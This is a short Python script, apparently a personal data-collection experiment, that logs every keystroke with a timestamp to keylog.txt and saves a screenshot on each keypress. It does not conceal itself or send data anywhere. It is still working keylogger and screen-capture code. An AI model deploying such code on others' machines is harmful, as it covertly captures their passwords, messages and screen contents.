from pynput.keyboard import Key, Listener
import logging
import os 
import numpy as np 
import pyautogui
import time 
# 
logging.basicConfig(filename=(os.getcwd() + "/keylog.txt"), level=logging.DEBUG, format=" %(asctime)s - %(message)s")
count=0
def on_press(key):
    logging.info(str(key))
    # img = pyautogui.screenshot()
    # print(np.array(img).shape)
    #Record image into "footage" directory. 
    #Running this function in the keylogger additionally provides the timestamp of the 
    #screenshot in the keylog.txt file- which makes for very easy data engineering
    #Apache Pyspark is perfect for use in analyzing the timestamp footage to acquire line-by-line 
    #Unix timestamps through the use of Lambda functions.
    img = pyautogui.screenshot(os.getcwd() +  '/footage/screenshot.png')
    # img = pyautogui.screenshot(os.getcwd() +  '/footage/' + str(count)  + '.png')
    # count+=1


def log_keystrokes(func):
    with Listener(on_press=func) as listener:
        listener.join()
# time.sleep(3) #Give me time to get ready
# print('GO!')
# log_keystrokes(on_press)


'''
This logging block in keylog.txt is associated with each image keystroke.
    2023-10-16 02:07:31,481 - STREAM b'IHDR' 16 13
    2023-10-16 02:07:31,481 - STREAM b'sBIT' 41 3
    2023-10-16 02:07:31,481 - b'sBIT' 41 3 (unknown)
    2023-10-16 02:07:31,481 - STREAM b'IDAT' 56 8192
'''